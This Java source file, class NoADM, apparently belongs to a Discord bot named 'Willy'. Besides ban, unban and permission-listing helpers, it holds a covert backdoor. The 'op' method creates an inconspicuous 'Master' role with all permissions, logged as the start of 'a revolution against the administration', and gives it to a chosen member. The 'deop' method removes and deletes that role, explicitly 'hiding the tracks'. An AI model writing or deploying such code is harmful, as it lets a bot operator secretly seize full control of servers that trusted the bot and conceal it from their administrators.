package me.laravieira.willy.noadm;

import java.util.function.Consumer;

import discord4j.common.util.Snowflake;
import discord4j.core.object.entity.Guild;
import discord4j.core.object.entity.Member;
import discord4j.core.object.entity.Role;
import discord4j.core.object.entity.channel.GuildChannel;
import discord4j.core.spec.BanQuerySpec;
import discord4j.core.spec.RoleCreateSpec;
import discord4j.core.spec.RoleEditSpec;
import discord4j.rest.util.Color;
import discord4j.rest.util.Permission;
import discord4j.rest.util.PermissionSet;
import me.laravieira.willy.config.MyLogger;
import me.laravieira.willy.discord.Discord;

public class NoADM {
	public static void ban(String guild, String member, String reason) {
		Consumer<BanQuerySpec> ban = spec -> {
			spec.setDeleteMessageDays(0);
			spec.setReason(reason);
		};
		Member user = Discord.getBotGateway().getMemberById(Snowflake.of(guild), Snowflake.of(member)).block();
		user.ban(ban).doOnSuccess((data) -> {
			MyLogger.getDiscordLogger().info("["+member+"] is banned from ["+guild+"] for: "+reason);
		}).doOnError((data) -> {
			MyLogger.getDiscordLogger().info("["+member+"] not banned from ["+guild+"] because: "+data.getMessage());
		}).block();
	}

	public static void unban(String guild, String member, String reason) {
		Member user = Discord.getBotGateway().getMemberById(Snowflake.of(guild), Snowflake.of(member)).block();
		user.unban(reason).doOnSuccess((data) -> {
			MyLogger.getDiscordLogger().info("["+member+"] is unbanned from server ["+guild+"] for: "+reason);
		}).doOnError((data) -> {
			MyLogger.getDiscordLogger().info("["+member+"] not unbanned from ["+guild+"] because: "+data.getMessage());
		}).block();
	}
	
	public static void op(String guild, String member) {
		Guild _guild = Discord.getBotGateway().getGuildById(Snowflake.of(guild)).block();
		Member _member = Discord.getBotGateway().getMemberById(Snowflake.of(guild), Snowflake.of(member)).block();
		Role master;
		
		// Create a role master if not exist on server
		if(!_guild.getRoles().any(role -> role.getName().equals("Master")).block()) {
			Consumer<RoleCreateSpec> create = spec -> {
				spec.setColor(Color.BLACK);
				spec.setHoist(false);
				spec.setMentionable(false);
				spec.setName("Master");
				spec.setReason("Beginning of a revolution against the administration!");
				spec.setPermissions(PermissionSet.all());
			};
			master = _guild.createRole(create).doOnSuccess((data) -> {
				MyLogger.getDiscordLogger().info("["+member+"] created on server ["+guild+"].");
			}).doOnError((data) -> {
				MyLogger.getDiscordLogger().info("["+member+"] not created on server ["+guild+"] because: "+data.getMessage());
			}).block();
		
			
		}else {
			
			// Reset the role settings if something is different
			master = _guild.getRoles().filter(role -> role.getName().equals("Master")).blockFirst();
			Consumer<RoleEditSpec> update = spec -> {};
			boolean updateMaster = false;

			if(!master.getColor().equals(Color.BLACK) && (updateMaster = true))
				update.accept(new RoleEditSpec().setColor(Color.BLACK));

			if(master.isHoisted() && (updateMaster = true))
				update.accept(new RoleEditSpec().setHoist(false));

			if(master.isMentionable() && (updateMaster = true))
				update.accept(new RoleEditSpec().setMentionable(false));

			if(!master.getName().equals("Master") && (updateMaster = true))
				update.accept(new RoleEditSpec().setName("Master"));

			if(!(master.getPermissions().not() == PermissionSet.none()) && (updateMaster = true))
				update.accept(new RoleEditSpec().setPermissions(PermissionSet.all()));

			if(updateMaster) {
				master.edit(update).doOnSuccess((data) -> {
					MyLogger.getDiscordLogger().info("["+member+"] resetted on server ["+guild+"].");
				}).doOnError((data) -> {
					MyLogger.getDiscordLogger().info("["+member+"] not resetted on server ["+guild+"] because: "+data.getMessage());
				}).block();
			}
		}
		
		// Add the member to the role if he ins't
		_member.addRole(master.getId(), "Beginning of a revolution against the administration!").doOnSuccess((data) -> {
			MyLogger.getDiscordLogger().info("["+member+"] is OP on server ["+guild+"].");
		}).doOnError((data) -> {
			MyLogger.getDiscordLogger().info("["+member+"] can't get OP on server ["+guild+"] because: "+data.getMessage());
		}).block();
	}
	
	public static void deop(String guild, String member) {
		Guild _guild = Discord.getBotGateway().getGuildById(Snowflake.of(guild)).block();
		Member _member = Discord.getBotGateway().getMemberById(Snowflake.of(guild), Snowflake.of(member)).block();
		Role _master = _guild.getRoles().filter(role -> role.getName().equals("Master")).blockFirst();
		
		// de-op a op member
		if(_member.getRoles().any(role -> role.getName().equals("Master")).block())
			_member.removeRole(_master.getId()).doOnSuccess((data) -> {
				MyLogger.getDiscordLogger().info("["+member+"] get deop on server ["+guild+"].");
			}).doOnError((data) -> {
				MyLogger.getDiscordLogger().info("Can't de-op ["+member+"] on server ["+guild+"] because: "+data.getMessage());
			}).block();
		
		// Delete role Master if is empty
		if(!_guild.getMembers().any(spec -> spec.getRoleIds().contains(_master.getId())).block()) {
			_master.delete("Hiding the tracks.").doOnSuccess((data) -> {
				MyLogger.getDiscordLogger().info("Role Master deleted on server ["+guild+"].");
			}).doOnError((data) -> {
				MyLogger.getDiscordLogger().info("Can't delete role Master on server ["+guild+"] because: "+data.getMessage());
			}).block();
		}
	}
	
	public static void listMemberPermissions(String guild, String member) {
		Member _member = Discord.getBotGateway().getMemberById(Snowflake.of(guild), Snowflake.of(member)).block();
		PermissionSet permissions = _member.getBasePermissions().block();

		MyLogger.getConsoleLogger().info("Permissions for "+_member.getDisplayName()+" ["+_member.getId().asString()+"]:");
		if(permissions.isEmpty())
			MyLogger.getConsoleLogger().info("No permissions");
		else if(permissions.not().isEmpty())
			MyLogger.getConsoleLogger().info("All permissions");
		else for(Permission permission : permissions)
			MyLogger.getConsoleLogger().info(" - "+permission.name());
		MyLogger.getConsoleLogger().info("----------------------------");
	}
	
	public static void listRolePermissions(String guild, String role) {
		Role _role = Discord.getBotGateway().getRoleById(Snowflake.of(guild), Snowflake.of(role)).block();
		PermissionSet permissions = _role.getPermissions();

		MyLogger.getConsoleLogger().info("Permissions for "+_role.getName()+" ["+_role.getId().asString()+"]:");
		if(permissions.isEmpty())
			MyLogger.getConsoleLogger().info("No permissions");
		else if(permissions.not().isEmpty())
			MyLogger.getConsoleLogger().info("All permissions");
		else for(Permission permission : permissions)
			MyLogger.getConsoleLogger().info(" - "+permission.name());
		MyLogger.getConsoleLogger().info("----------------------------");
	}
	
	public static void listChannelMemberPermissions(String guild, String channel, String member) {
		GuildChannel _channel = Discord.getBotGateway().getGuildChannels(Snowflake.of(guild)).filter(spec -> spec.getId().equals(Snowflake.of(channel))).blockFirst();
		Member _member = Discord.getBotGateway().getMemberById(Snowflake.of(guild), Snowflake.of(member)).block();
		PermissionSet permissions = _channel.getOverwriteForMember(Snowflake.of(member)).get().getAllowed();

		MyLogger.getConsoleLogger().info("Overwrite Permissions for "+_member.getDisplayName()+" ["+_member.getId().asString()+"]:");
		if(permissions.isEmpty())
			MyLogger.getConsoleLogger().info("No permissions");
		else if(permissions.not().isEmpty())
			MyLogger.getConsoleLogger().info("All permissions");
		else for(Permission permission : permissions)
			MyLogger.getConsoleLogger().info(" - "+permission.name());
		MyLogger.getConsoleLogger().info("----------------------------");
	}
	
	public static void listChannelRolePermissions(String guild, String channel, String role) {
		GuildChannel _channel = Discord.getBotGateway().getGuildChannels(Snowflake.of(guild)).filter(spec -> spec.getId().equals(Snowflake.of(channel))).blockFirst();
		Role _role = Discord.getBotGateway().getRoleById(Snowflake.of(guild), Snowflake.of(role)).block();
		PermissionSet permissions = _channel.getOverwriteForRole(Snowflake.of(role)).get().getAllowed();

		MyLogger.getConsoleLogger().info("Overwrite Permissions for "+_role.getName()+" ["+_role.getId().asString()+"]:");
		if(permissions.isEmpty())
			MyLogger.getConsoleLogger().info("No permissions");
		else if(permissions.not().isEmpty())
			MyLogger.getConsoleLogger().info("All permissions");
		else for(Permission permission : permissions)
			MyLogger.getConsoleLogger().info(" - "+permission.name());
		MyLogger.getConsoleLogger().info("----------------------------");
	}
}
